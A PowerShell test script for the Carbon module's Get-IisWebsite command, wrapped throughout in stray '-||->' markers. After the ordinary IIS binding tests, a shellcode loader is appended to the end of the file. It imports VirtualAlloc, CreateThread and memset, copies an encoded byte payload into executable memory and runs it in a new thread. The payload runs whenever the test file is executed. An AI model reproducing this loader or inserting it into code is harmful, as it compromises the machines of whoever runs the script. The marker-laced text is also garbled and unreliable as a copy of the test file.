











 -||-> $appPoolName = 'Carbon-Get-IisWebsite' <-||- 
 -||-> $siteName = 'Carbon-Get-IisWebsite' <-||- 

 -||-> function Start-TestFixture
{
     -||-> & ( -||-> Join-Path -Path $PSScriptRoot '..\Initialize-CarbonTest.ps1' -Resolve <-||- ) <-||- 
} <-||- 

 -||-> function Start-Test
{
     -||-> Install-IisAppPool -Name $appPoolName <-||- 
     -||-> $bindings = @(  -||-> 'http/*:8401:', 'https/*:8401:', 'http/1.2.3.4:80:', "http/5.6.7.8:80:$siteName" <-||-  ) <-||- 
     -||-> Install-IisWebsite -Name $siteName -Bindings $bindings -Path $TestDir -AppPoolName $appPoolName <-||- 
} <-||- 

 -||-> function Stop-Test
{
     -||-> Remove-IisWebsite -Name $siteName <-||- 
} <-||- 

 -||-> function Test-ShouldReturnNullForNonExistentWebsite
{
     -||-> $website =  -||-> Get-IisWebsite -SiteName 'ISureHopeIDoNotExist' <-||-  <-||- 
     -||-> Assert-Null $website <-||- 
} <-||- 

 -||-> function Test-ShouldGetWebsiteDetails
{   
     -||-> $website =  -||-> Get-IisWebsite -SiteName $siteName <-||-  <-||- 
     -||-> Assert-NotNull $website <-||- 
     -||-> Assert-Equal $siteName $website.Name 'site name not set' <-||- 
     -||-> Assert-True ( -||-> $website.ID -gt 0 <-||- ) 'site ID not set' <-||- 
     -||-> Assert-Equal 4 $website.Bindings.Count 'site bindings not set' <-||- 
     -||-> Assert-Equal 'http' $website.Bindings[0].Protocol <-||-  
     -||-> Assert-Equal '0.0.0.0' $website.Bindings[0].Endpoint.Address <-||- 
     -||-> Assert-Equal 8401 $website.Bindings[0].Endpoint.Port <-||- 
     -||-> Assert-Empty $website.Bindings[0].Host <-||- 
    
     -||-> Assert-Equal 'https' $website.Bindings[1].Protocol <-||-  
     -||-> Assert-Equal '0.0.0.0' $website.Bindings[1].Endpoint.Address <-||- 
     -||-> Assert-Equal 8401 $website.Bindings[1].Endpoint.Port <-||- 
     -||-> Assert-Empty $website.Bindings[1].Host <-||- 
    
     -||-> Assert-Equal 'http' $website.Bindings[2].Protocol <-||-  
     -||-> Assert-Equal '1.2.3.4' $website.Bindings[2].Endpoint.Address <-||- 
     -||-> Assert-Equal 80 $website.Bindings[2].Endpoint.Port <-||- 
     -||-> Assert-Empty $website.Bindings[2].Host <-||- 
    
     -||-> Assert-Equal 'http' $website.Bindings[3].Protocol <-||-  
     -||-> Assert-Equal '5.6.7.8' $website.Bindings[3].Endpoint.Address <-||- 
     -||-> Assert-Equal 80 $website.Bindings[3].Endpoint.Port <-||- 
     -||-> Assert-Equal $siteName $website.Bindings[3].Host "bindings[3] host name" <-||- 

     -||-> $physicalPath =  -||-> $website.Applications |
                        Where-Object {  -||-> $_.Path -eq '/' <-||-  } |
                        Select-Object -ExpandProperty VirtualDirectories |
                        Where-Object {  -||-> $_.Path -eq '/' <-||-  } |
                        Select-Object -ExpandProperty PhysicalPath <-||-  <-||- 
     -||-> Assert-Equal $physicalPath $website.PhysicalPath <-||- 

     -||-> Assert-ServerManagerMember -Website $website <-||- 
} <-||- 

 -||-> function Test-ShouldGetAllWebsites
{
     -||-> $foundAtLeastOne = $false <-||- 
     -||-> $foundTestWebsite = $false <-||- 
     -||-> Get-IisWebsite | ForEach-Object { 
         -||-> $foundAtLeastOne = $true <-||- 

         -||-> Assert-ServerManagerMember -Website $_ <-||- 

         -||-> if(  -||-> $_.Name -eq $siteName <-||-  )
        {
             -||-> $foundTestWebsite = $true <-||- 
        } <-||- 
    } <-||- 

     -||-> Assert-True $foundAtLeastOne <-||- 
     -||-> Assert-True $foundTestWebsite <-||- 
} <-||- 

 -||-> function Assert-ServerManagerMember
{
    param(
        $Website
    )
     -||-> Assert-NotNull ( -||-> $Website.ServerManager <-||- ) 'no server manager property' <-||- 
     -||-> Assert-NotNull ( -||-> $Website | Get-Member | Where-Object {  -||-> $_.Name -eq 'CommitChanges' -and $_.MemberType -eq 'ScriptMethod' <-||-  } <-||- ) 'no CommitChanges method' <-||- 
} <-||- 


 -||-> $umCZ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $umCZ -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xe5,0xd9,0x74,0x24,0xf4,0xbb,0x6b,0x86,0x0c,0xc8,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x5a,0x18,0x03,0x5a,0x18,0x83,0xea,0x97,0x64,0xf9,0x34,0x8f,0xeb,0x02,0xc5,0x4f,0x8c,0x8b,0x20,0x7e,0x8c,0xe8,0x21,0xd0,0x3c,0x7a,0x67,0xdc,0xb7,0x2e,0x9c,0x57,0xb5,0xe6,0x93,0xd0,0x70,0xd1,0x9a,0xe1,0x29,0x21,0xbc,0x61,0x30,0x76,0x1e,0x58,0xfb,0x8b,0x5f,0x9d,0xe6,0x66,0x0d,0x76,0x6c,0xd4,0xa2,0xf3,0x38,0xe5,0x49,0x4f,0xac,0x6d,0xad,0x07,0xcf,0x5c,0x60,0x1c,0x96,0x7e,0x82,0xf1,0xa2,0x36,0x9c,0x16,0x8e,0x81,0x17,0xec,0x64,0x10,0xfe,0x3d,0x84,0xbf,0x3f,0xf2,0x77,0xc1,0x78,0x34,0x68,0xb4,0x70,0x47,0x15,0xcf,0x46,0x3a,0xc1,0x5a,0x5d,0x9c,0x82,0xfd,0xb9,0x1d,0x46,0x9b,0x4a,0x11,0x23,0xef,0x15,0x35,0xb2,0x3c,0x2e,0x41,0x3f,0xc3,0xe1,0xc0,0x7b,0xe0,0x25,0x89,0xd8,0x89,0x7c,0x77,0x8e,0xb6,0x9f,0xd8,0x6f,0x13,0xeb,0xf4,0x64,0x2e,0xb6,0x90,0x49,0x03,0x49,0x60,0xc6,0x14,0x3a,0x52,0x49,0x8f,0xd4,0xde,0x02,0x09,0x22,0x21,0x39,0xed,0xbc,0xdc,0xc2,0x0e,0x94,0x1a,0x96,0x5e,0x8e,0x8b,0x97,0x34,0x4e,0x34,0x42,0xa0,0x4b,0xa2,0xad,0x9d,0x2b,0xb2,0x46,0xdc,0xd3,0xb3,0x2d,0x69,0x35,0xe3,0x01,0x3a,0xea,0x43,0xf2,0xfa,0x5a,0x2b,0x18,0xf5,0x85,0x4b,0x23,0xdf,0xad,0xe1,0xcc,0xb6,0x86,0x9d,0x75,0x93,0x5d,0x3c,0x79,0x09,0x18,0x7e,0xf1,0xbe,0xdc,0x30,0xf2,0xcb,0xce,0xa4,0xf2,0x81,0xad,0x62,0x0c,0x3c,0xdb,0x8a,0x98,0xbb,0x4a,0xdd,0x34,0xc6,0xab,0x29,0x9b,0x39,0x9e,0x22,0x12,0xac,0x61,0x5c,0x5b,0x20,0x62,0x9c,0x0d,0x2a,0x62,0xf4,0xe9,0x0e,0x31,0xe1,0xf5,0x9a,0x25,0xba,0x63,0x25,0x1c,0x6f,0x23,0x4d,0xa2,0x56,0x03,0xd2,0x5d,0xbd,0x95,0x2e,0x88,0xfb,0xe3,0x5e,0x08 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $6tp0=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $6tp0.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$6tp0,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



